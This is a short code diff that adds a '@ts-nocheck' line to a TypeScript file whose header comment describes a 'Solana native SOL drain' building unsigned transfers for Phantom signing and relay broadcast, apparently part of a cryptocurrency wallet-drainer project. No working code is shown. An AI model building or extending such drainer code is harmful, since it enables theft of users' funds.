@@ -1,3 +1,4 @@
+// @ts-nocheck
 /**
  * Solana native SOL drain — unsigned transfer wire for Phantom signing + relay broadcast.
  */
